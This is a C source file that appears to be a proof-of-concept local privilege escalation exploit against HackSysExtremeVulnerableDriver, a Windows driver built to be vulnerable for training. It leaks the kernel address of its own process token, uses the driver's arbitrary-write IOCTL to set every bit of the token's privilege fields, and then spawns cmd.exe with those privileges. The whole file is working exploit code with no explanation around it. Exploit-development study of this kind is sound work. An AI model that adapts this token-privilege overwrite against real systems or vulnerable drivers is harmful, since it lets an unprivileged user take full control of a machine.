#include <stdio.h>
#include <Windows.h>

#include <stdint.h>

#define ARBWRITE_IOCTL 0x22200B

typedef struct _ARBWRITE_USER_BUF
{
    PVOID What;
    PVOID Where;
} ARBWRITE_USER_BUF, *PARBWRITE_USER_BUF;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[ 1 ];
 } SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS ( NTAPI* pNtQuerySystemInformation )(
    ULONG                    SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
);

#define SystemHandleInformation 0x10

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

int main( void )
{
    //
    // open handle to device object with typical attributes
    //
    HANDLE Device = CreateFileW( 
        L"\\\\.\\HackSysExtremeVulnerableDriver", 
        GENERIC_READ | GENERIC_WRITE, 
        FILE_SHARE_READ | FILE_SHARE_WRITE, 
        NULL, OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL );

    if ( Device == INVALID_HANDLE_VALUE )
    {
        printf( "Failed to get device handle!\n" );
        goto FAIL;
    }

    HANDLE Token = INVALID_HANDLE_VALUE;
    if ( !OpenProcessToken( GetCurrentProcess( ), TOKEN_ALL_ACCESS, &Token ) )
    {
        printf( "Failed to get token handle!\n" );
        goto FAIL;
    }

    NTSTATUS Status = 0;
    ULONG RetLength = 0;

    pNtQuerySystemInformation NtQuerySystemInformation = ( pNtQuerySystemInformation ) GetProcAddress( GetModuleHandleW( L"ntdll.dll" ), "NtQuerySystemInformation" );
    if ( !NtQuerySystemInformation )
    {
        printf( "Failed to get syscall handle!\n" );
        goto FAIL;
    }

    PSYSTEM_HANDLE_INFORMATION HandleInfo = ( PSYSTEM_HANDLE_INFORMATION ) malloc( 0x1000 );

    Status = NtQuerySystemInformation( SystemHandleInformation, HandleInfo, 0x1000, &RetLength );
    if ( Status == STATUS_INFO_LENGTH_MISMATCH )
    {
        free( HandleInfo );

        HandleInfo = (PSYSTEM_HANDLE_INFORMATION) malloc( RetLength );
        Status = NtQuerySystemInformation( SystemHandleInformation, HandleInfo, RetLength, &RetLength );
    }

    if ( !HandleInfo )
        goto FAIL;

    //
    // get token object kernel va leak
    //
    printf( "Handles: 0x%ul\n", HandleInfo->NumberOfHandles );

    PVOID TokenObject = 0;
    for ( size_t i = 0; i < HandleInfo->NumberOfHandles; ++i )
    {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO Entry = HandleInfo->Handles[ i ];
        if ( Entry.UniqueProcessId == GetCurrentProcessId( ) && (HANDLE) Entry.HandleValue == Token )
        {
            printf( "Token Object: 0x%p\n", Entry.Object );

            TokenObject = Entry.Object;
            break;
        }
    }

    free( HandleInfo );

    if ( !TokenObject )
    {
        printf( "Failed to get token new handle!\n" );
        goto FAIL;
    }

    //
    // kd> dt nt!_TOKEN Privileges
    //      0x040 Privileges : _SEP_TOKEN_PRIVILEGES
    // kd> dt nt!_TOKEN Privileges.
    //      0x040 Privileges  :
    //          0x000 Present : Uint8B
    //          0x008 Enabled : Uint8B
    //          0x010 EnabledByDefault : Uint8B
    //

    ARBWRITE_USER_BUF UserBuffer;
    RtlZeroMemory( &UserBuffer, sizeof( UserBuffer ) );

    ULONGLONG T = 0xffffffffffffffff;

    UserBuffer.What = &T;
    UserBuffer.Where = (PVOID)((ULONGLONG) TokenObject + 0x40);

    if ( !DeviceIoControl( Device, ARBWRITE_IOCTL, &UserBuffer, sizeof( UserBuffer ), NULL, NULL, &RetLength, NULL ) )
    {
        printf( "Errno: 0x%08x\n", GetLastError( ) );
        goto FAIL;
    }

    UserBuffer.Where = ( PVOID ) (( ULONGLONG ) TokenObject + 0x48 );

    if ( !DeviceIoControl( Device, ARBWRITE_IOCTL, &UserBuffer, sizeof( UserBuffer ), NULL, NULL, &RetLength, NULL ) )
    {
        printf( "Errno: 0x%08x\n", GetLastError( ) );
        goto FAIL;
    }

    UserBuffer.Where = ( PVOID ) (( ULONGLONG ) TokenObject + 0x50);

    if ( !DeviceIoControl( Device, ARBWRITE_IOCTL, &UserBuffer, sizeof( UserBuffer ), NULL, NULL, &RetLength, NULL ) )
    {
        printf( "Errno: 0x%08x\n", GetLastError( ) );
        goto FAIL;
    }

    printf( "Arbitrary Write Sent!\n" );


    PROCESS_INFORMATION ProcInfo;
    STARTUPINFO StartInfo;

    RtlZeroMemory( &ProcInfo, sizeof( ProcInfo ) );
    RtlZeroMemory( &StartInfo, sizeof( StartInfo ) );

    if ( !CreateProcessW( L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &StartInfo, &ProcInfo ) )
    {
        printf( "Failed to create process!\n" );
        goto FAIL;
    }

    CloseHandle( ProcInfo.hProcess );
    CloseHandle( ProcInfo.hThread );

    CloseHandle( Device );

    return 0;

FAIL:
    if ( Device != INVALID_HANDLE_VALUE )
        CloseHandle( Device );

    return 1;
}
